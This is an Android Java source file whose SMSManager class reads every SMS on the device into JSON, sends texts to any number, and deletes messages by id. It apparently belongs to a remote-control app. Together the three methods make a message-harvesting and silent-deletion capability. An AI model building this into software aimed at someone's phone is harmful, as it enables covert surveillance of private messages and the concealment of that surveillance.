package com.remote.app.Managers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import com.remote.app.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    public static JSONObject getsms()  {
        JSONObject result = null;
        JSONArray jarray = null;

        try {

            jarray = new JSONArray();

            result = new JSONObject();
            Uri uri = Uri.parse("content://sms/");
            Context act = MainService.getContextOfApplication();
            Cursor c= act.getContentResolver().query(uri, null, null ,null,null);

            // Read the sms data and store it in the list
            if(c.moveToFirst()) {

                for(int i=0; i < c.getCount(); i++) {

                    result.put(base.SMS.SMS_BODY,c.getString(c.getColumnIndexOrThrow("body")).toString());

                    result.put(base.SMS.SMS_DATE,c.getString(c.getColumnIndexOrThrow("date")).toString());
                    result.put(base.SMS.SMS_READ,c.getString(c.getColumnIndexOrThrow("read")).toString());
                    result.put(base.SMS.SMS_TYPE,c.getString(c.getColumnIndexOrThrow("type")).toString());
                    if((c.getString(c.getColumnIndexOrThrow("type")).toString()).equals("3")) {
                        String threadid = c.getString(c.getColumnIndexOrThrow("thread_id")).toString();
                        Cursor cur= act.getContentResolver().query(Uri.parse("content://mms-sms/conversations?simple=true"), null, "_id ="+threadid ,null,null);
                        if(cur.moveToFirst()) {
                            String  recipientId = cur.getString(cur.getColumnIndexOrThrow("recipient_ids")).toString();
                            cur=  act.getContentResolver().query(Uri.parse("content://mms-sms/canonical-addresses"), null, "_id = " + recipientId, null, null);
                            if(cur.moveToFirst()) {
                                String address = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
                                result.put(base.SMS.SMS_ADDRESS,address);
                                cur.close();
                            }
                        }

                    }else {
                        result.put(base.SMS.SMS_ADDRESS,c.getString(c.getColumnIndexOrThrow("address")).toString());
                    }
                    result.put(base.SMS.SMS_ID,c.getString(c.getColumnIndex("_id")));
                    jarray.put(result);
                    result = new JSONObject();

                    c.moveToNext();
                }
            }
            c.close();

            result.put(base.SMS.SMS_LIST, jarray);

        } catch (IllegalArgumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return result;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }

    public static boolean deleteSMS(Context context,String thread_id, String id) {
        try {
            Uri thread = Uri.parse("content://sms");
            ContentResolver contentResolver = context.getContentResolver();
//			Cursor cursor = contentResolver.query(thread, null, null, null,null);
            contentResolver.delete(thread, "thread_id=? and _id=?", new String[]{String.valueOf(thread_id), String.valueOf(id)});
            return true;
        }catch (Exception e){return false;}
    }


}
